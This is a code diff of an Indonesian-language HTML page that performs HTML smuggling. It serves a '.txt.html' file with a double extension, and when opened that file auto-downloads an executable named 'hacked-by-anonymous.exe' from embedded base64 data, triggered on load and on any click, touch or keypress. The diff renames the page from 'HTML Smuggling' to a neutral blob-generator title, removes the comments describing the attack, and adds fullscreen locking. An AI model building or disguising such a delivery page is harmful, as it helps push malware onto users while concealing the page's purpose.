@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>HTML Smuggling - MIME Sniffing</title>
+<title>Generator Berkas Blob &amp; ObjectURL</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -15,21 +15,26 @@ p { margin-bottom: 15px; line-height: 1.5; }
 button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
 #status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>HTML Smuggling (MIME Sniffing)</h2>
-<p>Mengunduh file .txt.html. Saat dibuka, browser akan merendernya sebagai HTML dan memicu unduhan .exe.</p>
+<h2>Generator Berkas Blob &amp; ObjectURL</h2>
+<p>Klik tombol untuk mengunduh file .txt.html yang saat dibuka akan memicu unduhan .exe.</p>
 
-<button id="start-btn" type="button">Mulai Generate Blob</button>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+
 <div id="status" role="status">Sistem siap.</div>
+<div id="downloads"></div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
@@ -39,6 +44,7 @@ const speak = (message) => {
         window.speechSynthesis.cancel();
         const utterance = new SpeechSynthesisUtterance(message);
         utterance.lang = 'id-ID';
+        utterance.rate = 1.0;
         window.speechSynthesis.speak(utterance);
     }
 };
@@ -85,16 +91,11 @@ const prepareMimeBlobAsync = (i) => {
             "try{" +
             "statusEl.textContent = 'Menyiapkan berkas...';" +
             "var bytesArr = b64KeBytes(b64Data);" +
-            
-            // MIME SNIFFING: Pakai application/octet-stream agar dianggap binary
             "var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
             "var url = URL.createObjectURL(blob);" +
             "var a = document.createElement('a');" +
             "a.href = url;" +
-            
-            // Eksekusi Unduhan .exe
             "a.download = 'hacked-by-anonymous.exe';" +
-            
             "a.style.display = 'none';" +
             "document.body.appendChild(a);" +
             "a.click();" +
@@ -110,11 +111,10 @@ const prepareMimeBlobAsync = (i) => {
             "sudah = false;" +
             "}" +
             "}" +
-            
-            // Auto trigger saat halaman dimuat & Klik
             "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
             "document.addEventListener('click', picuDownload);" +
             "document.addEventListener('touchstart', picuDownload);" +
+            "document.addEventListener('keydown', picuDownload);" +
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -131,38 +131,66 @@ const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
     
-    // TRIK EKSTENSI GANDA: .txt.html
+    // PERUBAHAN PENTING: Menggunakan ekstensi ganda .txt.html
     link.download = `waguri-file-${fileData.id}.txt.html`;
     
     link.textContent = `Blob #${fileData.id} (.txt.html)`;
     link.style.display = "none";
-    document.body.appendChild(link);
+    downloadsDiv.appendChild(link);
     link.click();
-    document.body.removeChild(link);
+};
+
+const processLoop = async (counter) => {
+    if (!isProcessing) return;
+
+    const fileData = await prepareMimeBlobAsync(counter);
+    activeUrls.push(fileData.url);
+
+    triggerInstantDownload(fileData);
+
+    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
+
+    if (counter % 10 === 0) {
+        speak(`Proses mencapai ${counter} berkas.`);
+    }
+    
+    // Hentikan setelah 1 file agar tidak spam (opsional)
+    if (counter >= 1) {
+        isProcessing = false;
+        startBtn.disabled = false;
+        return;
+    }
+
+    setTimeout(() => processLoop(counter + 1), 0);
 };
 
 startBtn.addEventListener("click", () => {
     if (isProcessing) return;
-    isProcessing = true;
-    startBtn.disabled = true;
-    statusDiv.textContent = "Menyiapkan file...";
 
-    speak("Menyiapkan file HTML Smuggling.");
+    activeUrls.forEach(url => URL.revokeObjectURL(url));
+    activeUrls = [];
+    downloadsDiv.replaceChildren();
+
+    speak("Mengaktifkan mode layar penuh.");
 
     const root = document.documentElement;
-    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}
-
-    setTimeout(async () => {
-        try {
-            const fileData = await prepareMimeBlobAsync(1);
-            activeUrls.push(fileData.url);
-            triggerInstantDownload(fileData);
-            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html.";
-        } catch(e) {
-            statusDiv.textContent = "Gagal: " + e.message;
+    try {
+        if (root.requestFullscreen) {
+            root.requestFullscreen();
+        } else if (root.webkitRequestFullscreen) {
+            root.webkitRequestFullscreen();
+        } else if (root.mozRequestFullScreen) {
+            root.mozRequestFullScreen();
         }
-        isProcessing = false;
-        startBtn.disabled = false;
+        statusDiv.textContent = "Mengunci layar penuh...";
+    } catch (err) {
+        console.warn("Fullscreen tidak didukung atau ditolak:", err);
+    }
+
+    setTimeout(() => {
+        isProcessing = true;
+        speak("Proses pembuatan berkas Blob dimulai.");
+        processLoop(1);
     }, 300);
 });
 </script>
